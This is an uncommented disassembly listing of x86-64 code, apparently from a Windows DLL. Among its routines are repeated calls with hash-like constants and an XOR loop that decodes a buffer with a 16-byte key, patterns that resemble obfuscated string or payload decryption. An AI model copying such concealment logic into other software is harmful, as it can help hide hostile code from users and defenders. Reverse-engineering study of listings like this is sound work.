    6d8cca23:	48 8d 0d cf f2 ff ff 	lea    -0xd31(%rip),%rcx        # 0x6d8cbcf9
    6d8cca2a:	e8 4e 82 ff ff       	call   0x6d8c4c7d
    6d8cca2f:	48 8d 0d b5 f2 ff ff 	lea    -0xd4b(%rip),%rcx        # 0x6d8cbceb
    6d8cca36:	e8 42 82 ff ff       	call   0x6d8c4c7d
    6d8cca3b:	48 8d 0d 9b f2 ff ff 	lea    -0xd65(%rip),%rcx        # 0x6d8cbcdd
    6d8cca42:	e8 36 82 ff ff       	call   0x6d8c4c7d
    6d8cca47:	48 8d 0d 81 f2 ff ff 	lea    -0xd7f(%rip),%rcx        # 0x6d8cbccf
    6d8cca4e:	e8 2a 82 ff ff       	call   0x6d8c4c7d
    6d8cca53:	48 8d 0d 67 f2 ff ff 	lea    -0xd99(%rip),%rcx        # 0x6d8cbcc1
    6d8cca5a:	e8 1e 82 ff ff       	call   0x6d8c4c7d
    6d8cca5f:	48 8d 0d 4d f2 ff ff 	lea    -0xdb3(%rip),%rcx        # 0x6d8cbcb3
    6d8cca66:	e8 12 82 ff ff       	call   0x6d8c4c7d
    6d8cca6b:	48 8d 0d 33 f2 ff ff 	lea    -0xdcd(%rip),%rcx        # 0x6d8cbca5
    6d8cca72:	e8 06 82 ff ff       	call   0x6d8c4c7d
    6d8cca77:	48 8d 0d 19 f2 ff ff 	lea    -0xde7(%rip),%rcx        # 0x6d8cbc97
    6d8cca7e:	e8 fa 81 ff ff       	call   0x6d8c4c7d
    6d8cca83:	48 8d 0d ff f1 ff ff 	lea    -0xe01(%rip),%rcx        # 0x6d8cbc89
    6d8cca8a:	e8 ee 81 ff ff       	call   0x6d8c4c7d
    6d8cca8f:	48 8d 0d e5 f1 ff ff 	lea    -0xe1b(%rip),%rcx        # 0x6d8cbc7b
    6d8cca96:	e8 e2 81 ff ff       	call   0x6d8c4c7d
    6d8cca9b:	48 8d 0d cb f1 ff ff 	lea    -0xe35(%rip),%rcx        # 0x6d8cbc6d
    6d8ccaa2:	e8 d6 81 ff ff       	call   0x6d8c4c7d
    6d8ccaa7:	48 8d 0d b1 f1 ff ff 	lea    -0xe4f(%rip),%rcx        # 0x6d8cbc5f
    6d8ccaae:	e8 ca 81 ff ff       	call   0x6d8c4c7d
    6d8ccab3:	48 8d 0d 97 f1 ff ff 	lea    -0xe69(%rip),%rcx        # 0x6d8cbc51
    6d8ccaba:	e8 be 81 ff ff       	call   0x6d8c4c7d
    6d8ccabf:	48 8d 0d 7d f1 ff ff 	lea    -0xe83(%rip),%rcx        # 0x6d8cbc43
    6d8ccac6:	e8 b2 81 ff ff       	call   0x6d8c4c7d
    6d8ccacb:	48 8d 0d 63 f1 ff ff 	lea    -0xe9d(%rip),%rcx        # 0x6d8cbc35
    6d8ccad2:	e8 a6 81 ff ff       	call   0x6d8c4c7d
    6d8ccad7:	48 8d 0d 49 f1 ff ff 	lea    -0xeb7(%rip),%rcx        # 0x6d8cbc27
    6d8ccade:	e8 9a 81 ff ff       	call   0x6d8c4c7d
    6d8ccae3:	48 8d 0d 2f f1 ff ff 	lea    -0xed1(%rip),%rcx        # 0x6d8cbc19
    6d8ccaea:	e8 8e 81 ff ff       	call   0x6d8c4c7d
    6d8ccaef:	48 8d 0d 15 f1 ff ff 	lea    -0xeeb(%rip),%rcx        # 0x6d8cbc0b
    6d8ccaf6:	e8 82 81 ff ff       	call   0x6d8c4c7d
    6d8ccafb:	48 8d 0d fb f0 ff ff 	lea    -0xf05(%rip),%rcx        # 0x6d8cbbfd
    6d8ccb02:	e8 76 81 ff ff       	call   0x6d8c4c7d
    6d8ccb07:	48 8d 0d e1 f0 ff ff 	lea    -0xf1f(%rip),%rcx        # 0x6d8cbbef
    6d8ccb0e:	e8 6a 81 ff ff       	call   0x6d8c4c7d
    6d8ccb13:	48 8d 0d 86 b8 0e 00 	lea    0xeb886(%rip),%rcx        # 0x6d9b83a0
    6d8ccb1a:	e8 4f 91 ff ff       	call   0x6d8c5c6e
    6d8ccb1f:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ccb24:	48 89 c1             	mov    %rax,%rcx
    6d8ccb27:	e8 0a d4 ff ff       	call   0x6d8c9f36
    6d8ccb2c:	45 31 c9             	xor    %r9d,%r9d
    6d8ccb2f:	45 31 c0             	xor    %r8d,%r8d
    6d8ccb32:	48 8d 15 e6 66 00 00 	lea    0x66e6(%rip),%rdx        # 0x6d8d321f
    6d8ccb39:	48 89 c1             	mov    %rax,%rcx
    6d8ccb3c:	e8 3c d2 ff ff       	call   0x6d8c9d7d
    6d8ccb41:	48 8d 0d 58 b8 0e 00 	lea    0xeb858(%rip),%rcx        # 0x6d9b83a0
    6d8ccb48:	48 89 05 e9 25 10 00 	mov    %rax,0x1025e9(%rip)        # 0x6d9cf138
    6d8ccb4f:	e8 1a 91 ff ff       	call   0x6d8c5c6e
    6d8ccb54:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ccb59:	48 89 c1             	mov    %rax,%rcx
    6d8ccb5c:	e8 d5 d3 ff ff       	call   0x6d8c9f36
    6d8ccb61:	45 31 c9             	xor    %r9d,%r9d
    6d8ccb64:	45 31 c0             	xor    %r8d,%r8d
    6d8ccb67:	48 8d 15 c3 66 00 00 	lea    0x66c3(%rip),%rdx        # 0x6d8d3231
    6d8ccb6e:	48 89 c1             	mov    %rax,%rcx
    6d8ccb71:	e8 07 d2 ff ff       	call   0x6d8c9d7d
    6d8ccb76:	48 8d 0d 23 b8 0e 00 	lea    0xeb823(%rip),%rcx        # 0x6d9b83a0
    6d8ccb7d:	48 89 05 a4 25 10 00 	mov    %rax,0x1025a4(%rip)        # 0x6d9cf128
    6d8ccb84:	e8 e5 90 ff ff       	call   0x6d8c5c6e
    6d8ccb89:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ccb8e:	48 89 c1             	mov    %rax,%rcx
    6d8ccb91:	e8 a0 d3 ff ff       	call   0x6d8c9f36
    6d8ccb96:	45 31 c9             	xor    %r9d,%r9d
    6d8ccb99:	45 31 c0             	xor    %r8d,%r8d
    6d8ccb9c:	48 8d 15 a2 66 00 00 	lea    0x66a2(%rip),%rdx        # 0x6d8d3245
    6d8ccba3:	48 89 c1             	mov    %rax,%rcx
    6d8ccba6:	e8 d2 d1 ff ff       	call   0x6d8c9d7d
    6d8ccbab:	48 8d 0d ee b7 0e 00 	lea    0xeb7ee(%rip),%rcx        # 0x6d9b83a0
    6d8ccbb2:	48 89 05 7f 26 10 00 	mov    %rax,0x10267f(%rip)        # 0x6d9cf238
    6d8ccbb9:	e8 b0 90 ff ff       	call   0x6d8c5c6e
    6d8ccbbe:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8ccbc3:	48 89 c1             	mov    %rax,%rcx
    6d8ccbc6:	e8 6b d3 ff ff       	call   0x6d8c9f36
    6d8ccbcb:	45 31 c9             	xor    %r9d,%r9d
    6d8ccbce:	45 31 c0             	xor    %r8d,%r8d
    6d8ccbd1:	48 8d 15 7c 66 00 00 	lea    0x667c(%rip),%rdx        # 0x6d8d3254
    6d8ccbd8:	48 89 c1             	mov    %rax,%rcx
    6d8ccbdb:	e8 9d d1 ff ff       	call   0x6d8c9d7d
    6d8ccbe0:	48 89 05 c1 25 10 00 	mov    %rax,0x1025c1(%rip)        # 0x6d9cf1a8
    6d8ccbe7:	e8 24 d4 ff ff       	call   0x6d8ca010
    6d8ccbec:	84 c0                	test   %al,%al
    6d8ccbee:	0f 85 5b 01 00 00    	jne    0x6d8ccd4f
    6d8ccbf4:	48 8d 0d e5 b5 0e 00 	lea    0xeb5e5(%rip),%rcx        # 0x6d9b81e0
    6d8ccbfb:	ba 1e 9a f2 4b       	mov    $0x4bf29a1e,%edx
    6d8ccc00:	e8 be f1 ff ff       	call   0x6d8cbdc3
    6d8ccc05:	48 8d 0d 24 26 10 00 	lea    0x102624(%rip),%rcx        # 0x6d9cf230
    6d8ccc0c:	48 89 c2             	mov    %rax,%rdx
    6d8ccc0f:	e8 66 ef ff ff       	call   0x6d8cbb7a
    6d8ccc14:	ba 3a 9d e8 2c       	mov    $0x2ce89d3a,%edx
    6d8ccc19:	48 8d 0d 60 b5 0e 00 	lea    0xeb560(%rip),%rcx        # 0x6d9b8180
    6d8ccc20:	e8 9e f1 ff ff       	call   0x6d8cbdc3
    6d8ccc25:	48 8d 0d 64 2a 10 00 	lea    0x102a64(%rip),%rcx        # 0x6d9cf690
    6d8ccc2c:	48 89 c2             	mov    %rax,%rdx
    6d8ccc2f:	e8 46 ef ff ff       	call   0x6d8cbb7a
    6d8ccc34:	ba 4e 82 2f 6c       	mov    $0x6c2f824e,%edx
    6d8ccc39:	48 8d 0d c0 b4 0e 00 	lea    0xeb4c0(%rip),%rcx        # 0x6d9b8100
    6d8ccc40:	e8 7e f1 ff ff       	call   0x6d8cbdc3
    6d8ccc45:	48 8d 0d bc 25 10 00 	lea    0x1025bc(%rip),%rcx        # 0x6d9cf208
    6d8ccc4c:	48 89 c2             	mov    %rax,%rdx
    6d8ccc4f:	e8 26 ef ff ff       	call   0x6d8cbb7a
    6d8ccc54:	ba ca 20 ca 1c       	mov    $0x1cca20ca,%edx
    6d8ccc59:	48 8d 0d 80 b2 0e 00 	lea    0xeb280(%rip),%rcx        # 0x6d9b7ee0
    6d8ccc60:	e8 5e f1 ff ff       	call   0x6d8cbdc3
    6d8ccc65:	48 8d 0d dc 24 10 00 	lea    0x1024dc(%rip),%rcx        # 0x6d9cf148
    6d8ccc6c:	48 89 c2             	mov    %rax,%rdx
    6d8ccc6f:	e8 06 ef ff ff       	call   0x6d8cbb7a
    6d8ccc74:	ba fe 9d 31 1c       	mov    $0x1c319dfe,%edx
    6d8ccc79:	48 8d 0d 00 b1 0e 00 	lea    0xeb100(%rip),%rcx        # 0x6d9b7d80
    6d8ccc80:	e8 3e f1 ff ff       	call   0x6d8cbdc3
    6d8ccc85:	48 8d 0d c4 24 10 00 	lea    0x1024c4(%rip),%rcx        # 0x6d9cf150
    6d8ccc8c:	48 89 c2             	mov    %rax,%rdx
    6d8ccc8f:	e8 e6 ee ff ff       	call   0x6d8cbb7a
    6d8ccc94:	ba d4 3d 0e 00       	mov    $0xe3dd4,%edx
    6d8ccc99:	48 8d 0d f0 72 00 00 	lea    0x72f0(%rip),%rcx        # 0x6d8d3f90
    6d8ccca0:	e8 6c f1 ff ff       	call   0x6d8cbe11
    6d8ccca5:	48 8d 0d 1c 25 10 00 	lea    0x10251c(%rip),%rcx        # 0x6d9cf1c8
    6d8cccac:	48 89 c2             	mov    %rax,%rdx
    6d8cccaf:	e8 c6 ee ff ff       	call   0x6d8cbb7a
    6d8cccb4:	ba da b6 1b 60       	mov    $0x601bb6da,%edx
    6d8cccb9:	48 8d 0d 80 72 00 00 	lea    0x7280(%rip),%rcx        # 0x6d8d3f40
    6d8cccc0:	e8 fe f0 ff ff       	call   0x6d8cbdc3
    6d8cccc5:	48 8d 0d 64 24 10 00 	lea    0x102464(%rip),%rcx        # 0x6d9cf130
    6d8ccccc:	48 89 c2             	mov    %rax,%rdx
    6d8ccccf:	e8 a6 ee ff ff       	call   0x6d8cbb7a
    6d8cccd4:	ba 2e d9 a0 25       	mov    $0x25a0d92e,%edx
    6d8cccd9:	48 8d 0d 20 72 00 00 	lea    0x7220(%rip),%rcx        # 0x6d8d3f00
    6d8ccce0:	e8 de f0 ff ff       	call   0x6d8cbdc3
    6d8ccce5:	48 89 c1             	mov    %rax,%rcx
    6d8ccce8:	e8 83 c2 ff ff       	call   0x6d8c8f70
    6d8ccced:	48 8d 0d 4c 24 10 00 	lea    0x10244c(%rip),%rcx        # 0x6d9cf140
    6d8cccf4:	48 89 c2             	mov    %rax,%rdx
    6d8cccf7:	e8 7e ee ff ff       	call   0x6d8cbb7a
    6d8cccfc:	ba 6a e3 35 6a       	mov    $0x6a35e36a,%edx
    6d8ccd01:	48 8d 0d 78 70 00 00 	lea    0x7078(%rip),%rcx        # 0x6d8d3d80
    6d8ccd08:	e8 b6 f0 ff ff       	call   0x6d8cbdc3
    6d8ccd0d:	48 8d 0d 54 25 10 00 	lea    0x102554(%rip),%rcx        # 0x6d9cf268
    6d8ccd14:	48 89 c2             	mov    %rax,%rdx
    6d8ccd17:	e8 5e ee ff ff       	call   0x6d8cbb7a
    6d8ccd1c:	ba de ff d4 1c       	mov    $0x1cd4ffde,%edx
    6d8ccd21:	48 8d 0d 98 6f 00 00 	lea    0x6f98(%rip),%rcx        # 0x6d8d3cc0
    6d8ccd28:	e8 96 f0 ff ff       	call   0x6d8cbdc3
    6d8ccd2d:	48 8d 0d 94 23 10 00 	lea    0x102394(%rip),%rcx        # 0x6d9cf0c8
    6d8ccd34:	48 89 c2             	mov    %rax,%rdx
    6d8ccd37:	e8 3e ee ff ff       	call   0x6d8cbb7a
    6d8ccd3c:	48 8b 35 fd 23 10 00 	mov    0x1023fd(%rip),%rsi        # 0x6d9cf140
    6d8ccd43:	31 c9                	xor    %ecx,%ecx
    6d8ccd45:	48 85 f6             	test   %rsi,%rsi
    6d8ccd48:	74 0c                	je     0x6d8ccd56
    6d8ccd4a:	48 8b 0e             	mov    (%rsi),%rcx
    6d8ccd4d:	eb 07                	jmp    0x6d8ccd56
    6d8ccd4f:	31 c9                	xor    %ecx,%ecx
    6d8ccd51:	e8 32 18 00 00       	call   0x6d8ce588
    6d8ccd56:	48 8d 1d e3 24 10 00 	lea    0x1024e3(%rip),%rbx        # 0x6d9cf240
    6d8ccd5d:	48 83 c6 10          	add    $0x10,%rsi
    6d8ccd61:	31 d2                	xor    %edx,%edx
    6d8ccd63:	48 89 df             	mov    %rbx,%rdi
    6d8ccd66:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8ccd68:	48 8b 0d c1 23 10 00 	mov    0x1023c1(%rip),%rcx        # 0x6d9cf130
    6d8ccd6f:	48 85 c9             	test   %rcx,%rcx
    6d8ccd72:	74 03                	je     0x6d8ccd77
    6d8ccd74:	48 8b 11             	mov    (%rcx),%rdx
    6d8ccd77:	48 8d 35 62 24 10 00 	lea    0x102462(%rip),%rsi        # 0x6d9cf1e0
    6d8ccd7e:	48 83 c1 10          	add    $0x10,%rcx
    6d8ccd82:	48 8d 2d f7 23 10 00 	lea    0x1023f7(%rip),%rbp        # 0x6d9cf180
    6d8ccd89:	49 89 f0             	mov    %rsi,%r8
    6d8ccd8c:	e8 86 f1 ff ff       	call   0x6d8cbf17
    6d8ccd91:	48 8b 05 30 24 10 00 	mov    0x102430(%rip),%rax        # 0x6d9cf1c8
    6d8ccd98:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8ccd9d:	48 89 ef             	mov    %rbp,%rdi
    6d8ccda0:	f3 a5                	rep movsl (%rsi),(%rdi)
    6d8ccda2:	48 85 c0             	test   %rax,%rax
    6d8ccda5:	74 03                	je     0x6d8ccdaa
    6d8ccda7:	48 8b 08             	mov    (%rax),%rcx
    6d8ccdaa:	e8 f4 8f ff ff       	call   0x6d8c5da3
    6d8ccdaf:	48 8d 3d ca 24 10 00 	lea    0x1024ca(%rip),%rdi        # 0x6d9cf280
    6d8ccdb6:	45 31 f6             	xor    %r14d,%r14d
    6d8ccdb9:	48 8d 0d a0 23 10 00 	lea    0x1023a0(%rip),%rcx        # 0x6d9cf160
    6d8ccdc0:	48 89 c2             	mov    %rax,%rdx
    6d8ccdc3:	e8 b2 ed ff ff       	call   0x6d8cbb7a
    6d8ccdc8:	49 89 d9             	mov    %rbx,%r9
    6d8ccdcb:	48 89 ea             	mov    %rbp,%rdx
    6d8ccdce:	48 89 f9             	mov    %rdi,%rcx
    6d8ccdd1:	48 c7 44 24 20 10 00 	movq   $0x10,0x20(%rsp)
    6d8ccdd8:	00 00 
    6d8ccdda:	41 b8 20 00 00 00    	mov    $0x20,%r8d
    6d8ccde0:	e8 38 f5 ff ff       	call   0x6d8cc31d
    6d8ccde5:	4c 8b 2d dc 23 10 00 	mov    0x1023dc(%rip),%r13        # 0x6d9cf1c8
    6d8ccdec:	4c 8b 3d 6d 23 10 00 	mov    0x10236d(%rip),%r15        # 0x6d9cf160
    6d8ccdf3:	4d 85 ed             	test   %r13,%r13
    6d8ccdf6:	74 04                	je     0x6d8ccdfc
    6d8ccdf8:	4d 8b 75 00          	mov    0x0(%r13),%r14
    6d8ccdfc:	48 8b 1d 85 28 10 00 	mov    0x102885(%rip),%rbx        # 0x6d9cf688
    6d8cce03:	4c 8d 25 5e 28 10 00 	lea    0x10285e(%rip),%r12        # 0x6d9cf668
    6d8cce0a:	31 f6                	xor    %esi,%esi
    6d8cce0c:	48 8d 2d 35 28 10 00 	lea    0x102835(%rip),%rbp        # 0x6d9cf648
    6d8cce13:	49 39 f6             	cmp    %rsi,%r14
    6d8cce16:	0f 8f 18 02 00 00    	jg     0x6d8cd034
    6d8cce1c:	ba 10 04 00 00       	mov    $0x410,%edx
    6d8cce21:	48 89 f9             	mov    %rdi,%rcx
    6d8cce24:	48 89 1d 5d 28 10 00 	mov    %rbx,0x10285d(%rip)        # 0x6d9cf688
    6d8cce2b:	e8 30 8f ff ff       	call   0x6d8c5d60
    6d8cce30:	ba 7a ca 4e 41       	mov    $0x414eca7a,%edx
    6d8cce35:	48 8d 0d e4 6d 00 00 	lea    0x6de4(%rip),%rcx        # 0x6d8d3c20
    6d8cce3c:	e8 82 ef ff ff       	call   0x6d8cbdc3
    6d8cce41:	48 8d 0d 78 23 10 00 	lea    0x102378(%rip),%rcx        # 0x6d9cf1c0
    6d8cce48:	48 89 c2             	mov    %rax,%rdx
    6d8cce4b:	e8 2a ed ff ff       	call   0x6d8cbb7a
    6d8cce50:	ba 0e be 08 49       	mov    $0x4908be0e,%edx
    6d8cce55:	48 8d 0d 04 6d 00 00 	lea    0x6d04(%rip),%rcx        # 0x6d8d3b60
    6d8cce5c:	e8 62 ef ff ff       	call   0x6d8cbdc3
    6d8cce61:	48 8d 0d 58 22 10 00 	lea    0x102258(%rip),%rcx        # 0x6d9cf0c0
    6d8cce68:	48 89 c2             	mov    %rax,%rdx
    6d8cce6b:	e8 0a ed ff ff       	call   0x6d8cbb7a
    6d8cce70:	48 8d 0d 29 b5 0e 00 	lea    0xeb529(%rip),%rcx        # 0x6d9b83a0
    6d8cce77:	e8 f2 8d ff ff       	call   0x6d8c5c6e
    6d8cce7c:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cce81:	48 89 c1             	mov    %rax,%rcx
    6d8cce84:	e8 ad d0 ff ff       	call   0x6d8c9f36
    6d8cce89:	45 31 c9             	xor    %r9d,%r9d
    6d8cce8c:	45 31 c0             	xor    %r8d,%r8d
    6d8cce8f:	48 8d 15 ca 63 00 00 	lea    0x63ca(%rip),%rdx        # 0x6d8d3260
    6d8cce96:	48 89 c1             	mov    %rax,%rcx
    6d8cce99:	e8 df ce ff ff       	call   0x6d8c9d7d
    6d8cce9e:	48 8d 0d fb b4 0e 00 	lea    0xeb4fb(%rip),%rcx        # 0x6d9b83a0
    6d8ccea5:	48 89 05 c4 23 10 00 	mov    %rax,0x1023c4(%rip)        # 0x6d9cf270
    6d8cceac:	e8 bd 8d ff ff       	call   0x6d8c5c6e
    6d8cceb1:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8cceb6:	48 89 c1             	mov    %rax,%rcx
    6d8cceb9:	e8 78 d0 ff ff       	call   0x6d8c9f36
    6d8ccebe:	45 31 c9             	xor    %r9d,%r9d
    6d8ccec1:	45 31 c0             	xor    %r8d,%r8d
    6d8ccec4:	48 8d 15 a2 63 00 00 	lea    0x63a2(%rip),%rdx        # 0x6d8d326d
    6d8ccecb:	48 89 c1             	mov    %rax,%rcx
    6d8ccece:	e8 aa ce ff ff       	call   0x6d8c9d7d
    6d8cced3:	ba 1a 78 07 27       	mov    $0x2707781a,%edx
    6d8cced8:	48 8d 0d c1 6a 00 00 	lea    0x6ac1(%rip),%rcx        # 0x6d8d39a0
    6d8ccedf:	48 89 05 32 23 10 00 	mov    %rax,0x102332(%rip)        # 0x6d9cf218
    6d8ccee6:	e8 d8 ee ff ff       	call   0x6d8cbdc3
    6d8cceeb:	48 8d 0d 2e 23 10 00 	lea    0x10232e(%rip),%rcx        # 0x6d9cf220
    6d8ccef2:	48 89 c2             	mov    %rax,%rdx
    6d8ccef5:	e8 80 ec ff ff       	call   0x6d8cbb7a
    6d8ccefa:	ba ee 10 c2 0a       	mov    $0xac210ee,%edx
    6d8cceff:	48 8d 0d 9a 69 00 00 	lea    0x699a(%rip),%rcx        # 0x6d8d38a0
    6d8ccf06:	e8 b8 ee ff ff       	call   0x6d8cbdc3
    6d8ccf0b:	48 8d 0d 4e 23 10 00 	lea    0x10234e(%rip),%rcx        # 0x6d9cf260
    6d8ccf12:	48 89 c2             	mov    %rax,%rdx
    6d8ccf15:	e8 60 ec ff ff       	call   0x6d8cbb7a
    6d8ccf1a:	ba aa a6 80 5d       	mov    $0x5d80a6aa,%edx
    6d8ccf1f:	48 8d 0d ba 68 00 00 	lea    0x68ba(%rip),%rcx        # 0x6d8d37e0
    6d8ccf26:	e8 98 ee ff ff       	call   0x6d8cbdc3
    6d8ccf2b:	48 8d 0d 1e 23 10 00 	lea    0x10231e(%rip),%rcx        # 0x6d9cf250
    6d8ccf32:	48 89 c2             	mov    %rax,%rdx
    6d8ccf35:	e8 40 ec ff ff       	call   0x6d8cbb7a
    6d8ccf3a:	ba 9e 5d 86 5b       	mov    $0x5b865d9e,%edx
    6d8ccf3f:	48 8d 0d fa 66 00 00 	lea    0x66fa(%rip),%rcx        # 0x6d8d3640
    6d8ccf46:	e8 78 ee ff ff       	call   0x6d8cbdc3
    6d8ccf4b:	48 8d 0d 16 22 10 00 	lea    0x102216(%rip),%rcx        # 0x6d9cf168
    6d8ccf52:	48 89 c2             	mov    %rax,%rdx
    6d8ccf55:	e8 20 ec ff ff       	call   0x6d8cbb7a
    6d8ccf5a:	ba ba 5f 85 32       	mov    $0x32855fba,%edx
    6d8ccf5f:	48 8d 0d da 64 00 00 	lea    0x64da(%rip),%rcx        # 0x6d8d3440
    6d8ccf66:	e8 58 ee ff ff       	call   0x6d8cbdc3
    6d8ccf6b:	48 8d 0d 2e 22 10 00 	lea    0x10222e(%rip),%rcx        # 0x6d9cf1a0
    6d8ccf72:	48 89 c2             	mov    %rax,%rdx
    6d8ccf75:	e8 00 ec ff ff       	call   0x6d8cbb7a
    6d8ccf7a:	ba ce b1 f5 41       	mov    $0x41f5b1ce,%edx
    6d8ccf7f:	48 8d 0d fa 63 00 00 	lea    0x63fa(%rip),%rcx        # 0x6d8d3380
    6d8ccf86:	e8 38 ee ff ff       	call   0x6d8cbdc3
    6d8ccf8b:	48 8d 0d 26 22 10 00 	lea    0x102226(%rip),%rcx        # 0x6d9cf1b8
    6d8ccf92:	48 89 c2             	mov    %rax,%rdx
    6d8ccf95:	e8 e0 eb ff ff       	call   0x6d8cbb7a
    6d8ccf9a:	ba 4a e7 c6 23       	mov    $0x23c6e74a,%edx
    6d8ccf9f:	48 8d 0d ba 63 00 00 	lea    0x63ba(%rip),%rcx        # 0x6d8d3360
    6d8ccfa6:	e8 18 ee ff ff       	call   0x6d8cbdc3
    6d8ccfab:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
    6d8ccfb0:	ba 08 00 00 00       	mov    $0x8,%edx
    6d8ccfb5:	4c 89 c1             	mov    %r8,%rcx
    6d8ccfb8:	49 89 c2             	mov    %rax,%r10
    6d8ccfbb:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
    6d8ccfc0:	e8 a6 eb ff ff       	call   0x6d8cbb6b
    6d8ccfc5:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
    6d8ccfca:	45 31 c9             	xor    %r9d,%r9d
    6d8ccfcd:	31 d2                	xor    %edx,%edx
    6d8ccfcf:	4c 89 d1             	mov    %r10,%rcx
    6d8ccfd2:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
    6d8ccfd9:	00 
    6d8ccfda:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6d8ccfe1:	00 00 
    6d8ccfe3:	e8 30 e0 ff ff       	call   0x6d8cb018
    6d8ccfe8:	48 8d 0d 39 22 10 00 	lea    0x102239(%rip),%rcx        # 0x6d9cf228
    6d8ccfef:	48 89 c2             	mov    %rax,%rdx
    6d8ccff2:	e8 83 eb ff ff       	call   0x6d8cbb7a
    6d8ccff7:	48 8b 0d 2a 22 10 00 	mov    0x10222a(%rip),%rcx        # 0x6d9cf228
    6d8ccffe:	e8 48 e4 ff ff       	call   0x6d8cb44b
    6d8cd003:	48 8b 0d 1e 22 10 00 	mov    0x10221e(%rip),%rcx        # 0x6d9cf228
    6d8cd00a:	e8 9a df ff ff       	call   0x6d8cafa9
    6d8cd00f:	48 8b 0d 12 22 10 00 	mov    0x102212(%rip),%rcx        # 0x6d9cf228
    6d8cd016:	e8 3e e4 ff ff       	call   0x6d8cb459
    6d8cd01b:	48 8b 0d 3e 21 10 00 	mov    0x10213e(%rip),%rcx        # 0x6d9cf160
    6d8cd022:	31 d2                	xor    %edx,%edx
    6d8cd024:	89 05 d6 21 10 00    	mov    %eax,0x1021d6(%rip)        # 0x6d9cf200
    6d8cd02a:	48 85 c9             	test   %rcx,%rcx
    6d8cd02d:	74 53                	je     0x6d8cd082
    6d8cd02f:	48 8b 11             	mov    (%rcx),%rdx
    6d8cd032:	eb 4e                	jmp    0x6d8cd082
    6d8cd034:	48 85 db             	test   %rbx,%rbx
    6d8cd037:	75 2a                	jne    0x6d8cd063
    6d8cd039:	48 89 ea             	mov    %rbp,%rdx
    6d8cd03c:	48 89 f9             	mov    %rdi,%rcx
    6d8cd03f:	4d 89 e1             	mov    %r12,%r9
    6d8cd042:	48 c7 44 24 20 20 00 	movq   $0x20,0x20(%rsp)
    6d8cd049:	00 00 
    6d8cd04b:	41 b8 20 00 00 00    	mov    $0x20,%r8d
    6d8cd051:	e8 35 f3 ff ff       	call   0x6d8cc38b
    6d8cd056:	ba 20 00 00 00       	mov    $0x20,%edx
    6d8cd05b:	48 89 e9             	mov    %rbp,%rcx
    6d8cd05e:	e8 6d b1 ff ff       	call   0x6d8c81d0
    6d8cd063:	41 8a 44 35 10       	mov    0x10(%r13,%rsi,1),%al
    6d8cd068:	32 84 1f e8 03 00 00 	xor    0x3e8(%rdi,%rbx,1),%al
    6d8cd06f:	48 ff c3             	inc    %rbx
    6d8cd072:	83 e3 0f             	and    $0xf,%ebx
    6d8cd075:	41 88 44 37 10       	mov    %al,0x10(%r15,%rsi,1)
    6d8cd07a:	48 ff c6             	inc    %rsi
    6d8cd07d:	e9 91 fd ff ff       	jmp    0x6d8cce13
    6d8cd082:	48 83 c1 10          	add    $0x10,%rcx
    6d8cd086:	e8 ef f7 ff ff       	call   0x6d8cc87a
    6d8cd08b:	ba 7e 19 1e 1c       	mov    $0x1c1e197e,%edx
    6d8cd090:	48 8d 0d e9 61 00 00 	lea    0x61e9(%rip),%rcx        # 0x6d8d3280
    6d8cd097:	e8 27 ed ff ff       	call   0x6d8cbdc3
    6d8cd09c:	48 8d 0d 0d 21 10 00 	lea    0x10210d(%rip),%rcx        # 0x6d9cf1b0
    6d8cd0a3:	48 89 c2             	mov    %rax,%rdx
    6d8cd0a6:	e8 cf ea ff ff       	call   0x6d8cbb7a
    6d8cd0ab:	90                   	nop
    6d8cd0ac:	48 83 c4 58          	add    $0x58,%rsp
    6d8cd0b0:	5b                   	pop    %rbx
    6d8cd0b1:	5e                   	pop    %rsi
    6d8cd0b2:	5f                   	pop    %rdi
    6d8cd0b3:	5d                   	pop    %rbp
    6d8cd0b4:	41 5c                	pop    %r12
    6d8cd0b6:	41 5d                	pop    %r13
    6d8cd0b8:	41 5e                	pop    %r14
    6d8cd0ba:	41 5f                	pop    %r15
    6d8cd0bc:	c3                   	ret
    6d8cd0bd:	e9 45 f9 ff ff       	jmp    0x6d8cca07
    6d8cd0c2:	48 8b 05 c7 b5 0e 00 	mov    0xeb5c7(%rip),%rax        # 0x6d9b8690
    6d8cd0c9:	c6 05 20 20 10 00 18 	movb   $0x18,0x102020(%rip)        # 0x6d9cf0f0
    6d8cd0d0:	48 c7 05 05 20 10 00 	movq   $0x8,0x102005(%rip)        # 0x6d9cf0e0
    6d8cd0d7:	08 00 00 00 
    6d8cd0db:	48 c7 05 02 20 10 00 	movq   $0x8,0x102002(%rip)        # 0x6d9cf0e8
    6d8cd0e2:	08 00 00 00 
    6d8cd0e6:	48 89 05 0b 20 10 00 	mov    %rax,0x10200b(%rip)        # 0x6d9cf0f8
    6d8cd0ed:	48 8d 05 7c e7 ff ff 	lea    -0x1884(%rip),%rax        # 0x6d8cb870
    6d8cd0f4:	48 89 05 15 20 10 00 	mov    %rax,0x102015(%rip)        # 0x6d9cf110
    6d8cd0fb:	c3                   	ret
    6d8cd0fc:	48 83 ec 38          	sub    $0x38,%rsp
    6d8cd100:	48 8d 05 c1 ea ff ff 	lea    -0x153f(%rip),%rax        # 0x6d8cbbc8
    6d8cd107:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8cd10c:	e8 8f 47 ff ff       	call   0x6d8c18a0
    6d8cd111:	e8 42 4a ff ff       	call   0x6d8c1b58
    6d8cd116:	e8 4c 7c ff ff       	call   0x6d8c4d67
    6d8cd11b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    6d8cd120:	e8 aa 4b ff ff       	call   0x6d8c1ccf
    6d8cd125:	e8 09 7c ff ff       	call   0x6d8c4d33
    6d8cd12a:	e8 d1 84 ff ff       	call   0x6d8c5600
    6d8cd12f:	e8 61 8b ff ff       	call   0x6d8c5c95
    6d8cd134:	e8 a7 8b ff ff       	call   0x6d8c5ce0
